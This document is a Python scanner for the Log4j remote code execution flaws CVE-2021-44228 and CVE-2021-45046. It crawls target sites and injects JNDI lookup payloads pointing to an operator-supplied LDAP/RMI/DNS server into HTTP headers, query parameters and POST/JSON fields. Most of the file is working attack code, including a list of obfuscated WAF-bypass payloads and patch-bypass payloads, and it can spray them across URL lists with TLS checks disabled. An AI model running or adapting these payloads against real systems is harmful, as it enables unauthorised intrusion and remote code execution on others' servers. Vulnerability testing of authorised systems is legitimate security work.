#!/usr/bin/env python3
# coding=utf-8
import argparse
import random
import requests
import sys
from urllib import parse as urlparse
import random
from colorama import Fore
from tqdm import tqdm
import re
from threading import Thread

# Disable SSL warnings
try:
    import requests.packages.urllib3
    requests.packages.urllib3.disable_warnings()
except Exception:
    pass


def title():
    print(Fore.YELLOW +"""
                                                                                 
,--.                   ,---.   ,--.  ,---.                                       
|  |  ,---.   ,---.   /    |   `--' '.-.  \      ,---.   ,---.  ,--,--. ,--,--,  
|  | | .-. | | .-. | /  '  |   ,--.  .-' .'     (  .-'  | .--' ' ,-.  | |      \ 
|  | ' '-' ' ' '-' ' '--|  |   |  | /   '-.     .-'  `) \ `--. \ '-'  | |  ||  | 
`--'  `---'  .`-  /     `--' .-'  / '-----'     `----'   `---'  `--`--' `--''--' 
             `---'           '---'                                               
""")
    print(Fore.YELLOW + '\t\t\tCVE-2021-44228 Log4j2 RCE\r\n' + '\t\t\t\t\t' + Fore.LIGHTBLUE_EX + 'By:K3rwin' + Fore.RESET)


default_headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36',
    'Accept': '*/*'  # not being tested to allow passing through checks on Accept header in older web-servers
}
post_data_parameters = ["username", "user", "email", "email_address", "password", "c"]
timeout = 4

waf_bypass_payloads = ["${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://{{server}}/{{random}}}",
                       "${${::-j}ndi:rmi://{{server}}/{{random}}}",
                       "${jndi:rmi://{{server}}}",
                       "${${lower:jndi}:${lower:rmi}://{{server}}/{{random}}}",
                       "${${lower:${lower:jndi}}:${lower:rmi}://{{server}}/{{random}}}",
                       "${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://{{server}}/{{random}}}",
                       "${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://{{server}}/{{random}}}",
                       "${jndi:dns://{{server}}}",
                       ]

cve_2021_45046 = [
                  "${jndi:ldap://127.0.0.1#{{server}}:1389/{{random}}}", # Source: https://twitter.com/marcioalm/status/1471740771581652995,
                  "${jndi:ldap://127.0.0.1#{{server}}/{{random}}}",
                  "${jndi:ldap://127.1.1.1#{{server}}/{{random}}}"
                 ]  


parser = argparse.ArgumentParser()
parser.add_argument("-u", "--url",
                    dest="url",
                    help="Check a single URL. example('http://vultest.com/test.jsp')",
                    action='store')
parser.add_argument("--crawler",
                    dest="craw",
                    help="use crawler, two-layer",
                    action='store_true')
parser.add_argument("-p", "--proxy",
                    dest="proxy",
                    help="send requests through proxy",
                    action='store')
parser.add_argument("-l", "--list",
                    dest="usedlist",
                    help="Check a list of URLs.",
                    action='store')
parser.add_argument("--request-type",
                    dest="request_type",
                    help="Request Type: (get, post) - [Default: get].",
                    default="get",
                    action='store')
parser.add_argument("--headers-file",
                    dest="headers_file",
                    help="Headers fuzzing list - [default: headers.txt].",
                    default="headers.txt",
                    action='store')
parser.add_argument("--run-all-tests",
                    dest="run_all_tests",
                    help="Run all available tests on each URL.",
                    action='store_true')
parser.add_argument("--exclude-user-agent-fuzzing",
                    dest="exclude_user_agent_fuzzing",
                    help="Exclude User-Agent header from fuzzing - useful to bypass weak checks on User-Agents.",
                    action='store_true')
parser.add_argument("--wait-time",
                    dest="wait_time",
                    help="Wait time after all URLs are processed (in seconds) - [Default: 5].",
                    default=5,
                    type=int,
                    action='store')
parser.add_argument("--waf-bypass",
                    dest="waf_bypass_payloads",
                    help="Extend scans with WAF bypass payloads.",
                    action='store_true')
parser.add_argument("--test-CVE-2021-45046",
                    dest="cve_2021_45046",
                    help="Test using payloads for CVE-2021-45046 (detection payloads).",
                    action='store_true')
parser.add_argument("--server",
                    dest="server",
                    help="ldap_server",
                    action='store')
parser.add_argument("--disable-http-redirects",
                    dest="disable_redirects",
                    help="Disable HTTP redirects. Note: HTTP redirects are useful as it allows the payloads to have higher chance of reaching vulnerable systems.",
                    action='store_true')

args = parser.parse_args()


proxies = {}
if args.proxy:
    proxies = {"http": args.proxy, "https": args.proxy}


def crawler(url):
    # 不需要的静态资源
    NoNeed = a=['GIF', 'PNG', 'BMP', 'JPEG', 'JPG', 'MP3', 'WMA', 'FLV', 'MP4', 'WMV', 'OGG', 'AVI', 'DOC', 'DOCX', 'XLS', 'XLSX', 'PPT', 'PPTX', 'TXT', 'PDF', 'ZIP', 'EXE', 'TAT', 'ICO', 'CSS', 'JS', 'SWF', 'APK', 'M3U8', 'TS']
    urls = []
    if url not in urls:
        urls.append(url)
    site = re.findall(r'\/\/([0-9a-zA-Z\.]*)[:\/]',url)[0]
    url1 = urlparse.urlparse(url)
    path = url1.path
    if "." in url1.path:
        path = '/'.join((url1.path.split('/'))[:-1]) + '/'
        
    url2 = url1.scheme + '://' + url1.netloc + path
    req = requests.get(url, headers=default_headers)
    html = req.text
    com = re.findall(r'(?<=href=")[^\"]+', html)
    for u in com:
        suffix = u.split('.')[-1].upper()
        if suffix in NoNeed:
            continue
        elif "#" in u:
            continue
        else:
            if "http" not in u:
                if "/" in u:
                    u = url2 + u
                else:
                    u = url2 + "/" + u 
            if site in u and u not in urls:
                urls.append(u)
    return urls


def get_fuzzing_headers(payload):
    fuzzing_headers = {}
    fuzzing_headers.update(default_headers)
    with open(args.headers_file, "r") as f:
        for i in f.readlines():
            i = i.strip()
            if i == "" or i.startswith("#"):
                continue
            fuzzing_headers.update({i: payload})
    if args.exclude_user_agent_fuzzing:
        fuzzing_headers["User-Agent"] = default_headers["User-Agent"]

    fuzzing_headers["Referer"] = f'https://{fuzzing_headers["Referer"]}'
    return fuzzing_headers


def get_fuzzing_post_data(payload):
    fuzzing_post_data = {}
    for i in post_data_parameters:
        fuzzing_post_data.update({i: payload})
    return fuzzing_post_data


def generate_waf_bypass_payloads(server, random_string):
    payloads = []
    for i in waf_bypass_payloads:
        new_payload = i.replace("{{server}}", server)
        new_payload = new_payload.replace("{{random}}", random_string)
        payloads.append(new_payload)
    return payloads

def get_cve_2021_45046_payloads(server, random_string):
    payloads = []
    for i in cve_2021_45046:
        new_payload = i.replace("{{server}}", server)
        new_payload = new_payload.replace("{{random}}", random_string)
        payloads.append(new_payload)
    return payloads


def parse_url(url):
    """
    Parses the URL.
    """

    # Url: https://example.com/login.jsp
    url = url.replace('#', '%23')
    url = url.replace(' ', '%20')

    if ('://' not in url):
        url = str("http://") + str(url)
    scheme = urlparse.urlparse(url).scheme

    # FilePath: /login.jsp
    file_path = urlparse.urlparse(url).path
    if (file_path == ''):
        # file_path = '/'
        pass

    return({"scheme": scheme,
            "site": f"{scheme}://{urlparse.urlparse(url).netloc}",
            "host":  urlparse.urlparse(url).netloc.split(":")[0],
            "file_path": file_path})


def scan_url(url, server, scan_log):
    parsed_url = parse_url(url)
    random_string = ''.join(random.choice('0123456789abcdefghijklmnopqrstuvwxyz') for i in range(7))
    payload = '${jndi:ldap://%s/%s}' % (server, random_string)
    payloads = [payload]
    if args.waf_bypass_payloads:
        payloads.extend(generate_waf_bypass_payloads(f'{parsed_url["host"]}.{server}', random_string))
    if args.cve_2021_45046:
        print(Fore.YELLOW + f"[•] Scanning for CVE-2021-45046 (Log4j v2.15.0 Patch Bypass - RCE)" + Fore.RESET)
        payloads = get_cve_2021_45046_payloads(f'{parsed_url["host"]}.{server}', random_string)
    for payload in payloads:
        scan_log.append(f"[•] URL: {url} | PAYLOAD: {payload}\n")
        if args.request_type.upper() == "GET" or args.run_all_tests:
            try:
                requests.request(url=url,
                                 method="GET",
                                 params={"v": payload},
                                 headers=get_fuzzing_headers(payload),
                                 verify=False,
                                 timeout=timeout,
                                 allow_redirects=(not args.disable_redirects),
                                 proxies=proxies)
            except Exception as e:
                print(f"EXCEPTION: {e}")
                print(f"fail to scan url:{url}")            

        if args.request_type.upper() == "POST" or args.run_all_tests:
            try:
                # Post body
                requests.request(url=url,
                                 method="POST",
                                 headers=get_fuzzing_headers(payload),
                                 data=get_fuzzing_post_data(payload),
                                 verify=False,
                                 timeout=timeout,
                                 allow_redirects=(not args.disable_redirects),
                                 proxies=proxies)
            except Exception as e:
                print(f"EXCEPTION: {e}")
                print(f"fail to scan url:{url}")       

            try:
                # JSON body
                requests.request(url=url,
                                 method="POST",
                                 headers=get_fuzzing_headers(payload),
                                 json=get_fuzzing_post_data(payload),
                                 verify=False,
                                 timeout=timeout,
                                 allow_redirects=(not args.disable_redirects),
                                 proxies=proxies)
            except Exception as e:
                print(f"EXCEPTION: {e}")
                print(f"fail to scan url:{url}")       

def main():
    title()
    if len(sys.argv) <= 1:
        print(Fore.RED + 'python3 %s -h for help.' % (sys.argv[0]) + Fore.RESET)
        exit(0)
    scan_log = []
    urls = []
    urls_l = []
    urls_s = []
    threads_craw = []
    threads_scan = []
    if args.url:
        if args.craw:
            urls = crawler(args.url)
            for url in urls:
                threads_craw.append(Thread(target=crawler, args=(url,)))
                threads_craw[-1].start()
            for thread1 in threads_craw:
                thread1.join()
        else:
            urls.append(args.url)
        
    if args.usedlist:
        with open(args.usedlist, "r") as f:
            for i in f.readlines():
                i = i.strip()
                if i == "" or i.startswith("#"):
                    continue
                if args.craw:
                    urls=crawler(i)
                    urls_l.append(urls)
                else:
                    urls.append(i)
        if args.craw:        
            for urls in urls_l:
                for url in urls:
                    threads_craw.append(Thread(target=crawler, args=(url,)))
                    threads_craw[-1].start()
            for thread1 in threads_craw:
                thread1.join()
    
    
    ldap_server = args.server

    print(Fore.RED + "[%] Checking for Log4j RCE CVE-2021-44228." + Fore.RESET)
    
    if not urls_l:
        for url in urls:
            threads_scan.append(Thread(target=scan_url, args=(url, ldap_server, scan_log,)))
            threads_scan[-1].start()
        for thread2 in tqdm(threads_scan, position=0):
            thread2.join()
            #scan_url(url, ldap_server, scan_log)

    else:
        for urls in urls_l:
            for url in urls:
                urls_s.append(url)
        for url in urls_s:
            threads_scan.append(Thread(target=scan_url, args=(url, ldap_server, scan_log,)))
            threads_scan[-1].start()
        for thread2 in tqdm(threads_scan, position=0):
            thread2.join()
            #scan_url(url, ldap_server, scan_log)       
    with open('scanfile.txt','w+') as f:
        for x in scan_log:
            f.write(x)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(Fore.RED + "\nKeyboardInterrupt Detected." + Fore.RESET)
        print(Fore.GREEN + "Exiting..." + Fore.RESET)
        exit(0)